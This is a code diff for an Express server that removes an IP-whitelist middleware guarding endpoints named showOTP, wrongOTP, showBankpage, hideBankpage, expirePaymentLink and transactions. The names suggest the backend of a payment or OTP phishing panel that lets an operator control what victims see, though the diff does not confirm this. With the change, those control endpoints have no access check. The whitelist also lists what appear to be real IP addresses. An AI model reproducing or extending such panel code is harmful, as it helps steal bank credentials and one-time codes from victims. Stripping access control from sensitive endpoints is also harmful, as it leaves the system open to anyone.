@@ -338,50 +338,6 @@ function cleanupInactiveVisitors() {
   }
 }
 
-// NEW ADDITION: IP whitelist middleware for admin-related API endpoints
-app.use((req, res, next) => {
-  // List of whitelisted IPs - replace these with your actual IPs
-  const whitelistedIPs = [
-    '110.227.53.195', // Replace with your actual IP
-    '2401:4900:55ce:81e8:1d61:f5f:c454:4bd4',     // Replace with your actual IP
-    'localhost',       // For local development
-    '127.0.0.1',       // For local development
-    '::1',             // For local development
-    // Add more IPs as needed
-  ];
-  
-  // Check if this is an admin endpoint
-  const isAdminEndpoint = (
-    req.path.includes('/api/transactions') ||
-    req.path.includes('/api/visitors') ||
-    req.path.includes('/api/expirePaymentLink') ||
-    req.path.includes('/api/showOTP') ||
-    req.path.includes('/api/wrongOTP') ||
-    req.path.includes('/api/updateRedirectStatus') ||
-    req.path.includes('/api/showBankpage') ||
-    req.path.includes('/api/hideBankpage')
-  );
-  
-  if (isAdminEndpoint) {
-    // Get client IP
-    const clientIP = req.headers['x-forwarded-for'] || 
-                     req.connection.remoteAddress || 
-                     req.socket.remoteAddress || 
-                     'Unknown';
-    
-    // Clean up the IP in case of proxies
-    const cleanIP = clientIP.split(',')[0].trim();
-    
-    // Check if IP is whitelisted
-    if (!whitelistedIPs.includes(cleanIP)) {
-      console.log(`Blocked admin access attempt from IP: ${cleanIP}`);
-      return res.status(403).json({ error: 'Access denied' });
-    }
-  }
-  
-  next();
-});
-
 // Serve static files
 app.use(express.static("."));
 
@@ -409,7 +365,7 @@ app.get('/api/visitors', (req, res) => {
     
     return res.json(visitorList);
   } catch (error) {
-    console.error('Error getting visitors:', error);
+  console.error('Error getting visitors:', error);
     return res.status(500).json({ error: 'Failed to get visitors' });
   }
 });
